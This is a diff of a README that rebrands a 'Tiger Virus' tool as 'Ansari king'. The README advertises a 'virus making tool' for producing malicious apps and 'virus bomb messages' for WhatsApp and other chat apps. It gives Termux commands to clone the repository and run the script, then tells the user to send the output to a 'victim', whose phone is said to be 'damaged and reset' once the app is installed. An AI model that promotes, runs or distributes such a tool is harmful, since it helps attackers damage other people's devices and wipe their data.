@@ -1,20 +1,20 @@
-<h1>Tiger Virus </h1>
+<h1>Ansari king </h1>
 
-<h3>WELCOME TO TIGER VIRUS TOOL</h3>
+<h3>WELCOME TO Ansari king TOOL</h3>
 
-<h4> Tiger Virus Created By ASHIK K I </h4>
+<h4> Ansari king Created By ASHIK K I </h4>
 
 *Best Virus Making Tool To Make Virus Applications and Messeges For Whatsapp And Other Chat Applications
 
-<h4>Tool by <strong>The Devil Tigers</strong></h4>
+<h4>Tool by <strong>The Ansari king</strong></h4>
 
 ![Screenshot_20201107-163215~2_compress68](https://user-images.githubusercontent.com/69100349/98444803-c3659900-2139-11eb-892f-86a352437f56.jpg)
 
 *For more details see my youtube channel 
 
-*Click :- [The Devil Tigers](https://www.youtube.com/c/thmalayalam)
+*Click :- [The Ansari king](https://www.youtube.com/c/thmalayalam)
 
-<h3>How to run this Tool "Tiger Virus"</h3>
+<h3>How to run this Tool "Ansari king"</h3>
 
 <h4>Commands</h4>
 
@@ -26,11 +26,11 @@ $ apt upgrade -y
 
 $ pkg install git -y
 
-$ git clone https://github.com/Devil-Tigers/TigerVirus.git
+$ git clone https://github.com/Ansari-king/Ansari king.git
 
-$ cd TigerVirus
+$ cd Ansariking
 
-$ bash TigerVirus.sh
+$ bash Ansariking.sh
 
 After Installation the Virus Applications or text file
 Send To Victim If Application
@@ -81,7 +81,7 @@ When Any One Install It. Their Phone Will Be Damaged and Reset!
 
 <h5>Total 30 virus bomb messages </h5>
 
-<h5>1 Tiger power message </h5>
+<h5>1 Ansari power message </h5>
 
 <h5>Testing</h5> 
 
